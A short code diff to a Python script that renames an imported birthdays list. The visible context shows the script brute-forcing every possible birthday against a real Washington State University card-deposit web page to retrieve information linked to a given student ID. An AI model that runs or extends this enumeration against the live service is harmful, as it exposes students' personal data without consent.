@@ -3,7 +3,7 @@ import sys
 import requests
 from bs4 import BeautifulSoup
 
-from birthdays import birthdays
+from birthdays import BIRTHDAYS
 
 ENDPOINT = "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC"
 
@@ -21,7 +21,7 @@ def get_info_for_wsu_id(wsu_id):
     prev_page = bs.find(id="__PREVIOUSPAGE").get('value')  # Mayn't be necessary
     event_val = bs.find(id="__EVENTVALIDATION").get('value')
 
-    for birthday in birthdays:
+    for birthday in BIRTHDAYS:
         # Brute force every possible birthday for the WSU ID
         print(f"Trying {birthday} on ID {wsu_id}")
         response = s.post(
